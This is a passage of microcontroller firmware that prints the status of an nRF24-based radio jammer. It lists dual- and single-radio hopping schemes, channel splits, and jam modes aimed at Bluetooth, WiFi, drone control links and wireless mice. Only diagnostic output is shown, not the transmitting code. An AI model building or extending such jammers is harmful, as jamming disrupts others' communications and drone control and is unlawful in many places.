        Serial.println("  Mode: DUAL-RADIO (Complementary frequency hopping)");
        Serial.println("  - Maximized coverage with coordinated channels");
        Serial.println("  - BT: R1=0-40, R2=40-78");
        Serial.println("  - Drone: R1=0-62, R2=63-125");
        Serial.println("  - 2x jamming power!");
    } else if (activeRadios == 1) {
        Serial.println("  Mode: SINGLE-RADIO (Aggressive sweeping)");
        Serial.println("  - Full spectrum coverage with fast hopping");
        Serial.println("  - Compensates with rapid channel switching");
    } else {
        Serial.println("  ERROR: No radios available!");
    }
    
    const char* modes[] = {"Bluetooth (0-78)", "Drone (0-125)", "WiFi (2412/2437/2462/2472)", "Multi-Ch BT+Drone", "Mouse (0-83)", "Targeted WiFi"}; // Updated modes for print
    int currentMode = AtomicUtils::safe_load(nrfJamMode);
    Serial.printf("\nCurrent Mode: %s\n", currentMode < 6 ? modes[currentMode] : "Unknown"); // Updated condition
    Serial.println("[NRF_STATUS] ====================\n");
}

#endif
